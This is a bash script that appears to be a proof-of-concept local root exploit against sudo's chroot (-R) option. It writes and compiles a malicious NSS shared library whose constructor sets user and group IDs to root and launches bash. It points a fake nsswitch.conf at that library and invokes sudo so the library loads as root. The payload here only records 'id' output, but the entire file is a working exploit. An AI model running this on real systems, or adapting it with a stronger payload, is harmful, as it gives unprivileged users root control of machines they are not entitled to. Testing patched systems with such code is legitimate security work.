#!/bin/bash

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "${STAGE}" || exit 1

cat > woot1337.c <<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", "-c", "id > /tmp/woot_result.txt", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc

gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "Executing via sudo -R..."

sudo -n -R woot woot

rm -rf "${STAGE}"
